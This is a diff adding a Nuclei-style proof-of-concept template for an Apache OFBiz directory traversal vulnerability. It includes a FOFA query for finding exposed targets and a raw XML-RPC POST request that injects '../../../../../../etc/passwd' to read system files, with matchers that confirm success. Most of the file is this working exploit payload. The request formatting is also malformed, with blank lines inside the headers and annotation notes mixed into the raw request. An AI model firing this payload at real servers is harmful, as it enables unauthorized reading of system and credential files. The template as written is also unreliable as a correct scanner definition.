@@ -1,0 +1,19 @@
+id: poc-9344108346
+info:
+  name: Apache OFBiz 目录遍历漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: lfi,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: product.name="OFBiz"
+http:
+- raw:
+  - "POST /webtools/control/xmlrpc HTTP/1.1\n\nContent-Type: text/xml\n\n\n\n<?xml version=\"1.0\"?>\n\n<methodCall>\n\n  <methodName>example.createBlogPost</methodName>\n\n  <params>\n\n    <param>\n\n      <value><string>../../../../../../etc/passwd</string></value>\n\n    </param>\n\n  </params>\n\n</methodCall>\n\n# 响应代码特征\n200\n\n# 响应内容特征\n^(?=.*?root)(?=.*?bin).*?$\n\n# 上传文件定位\n暂无"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
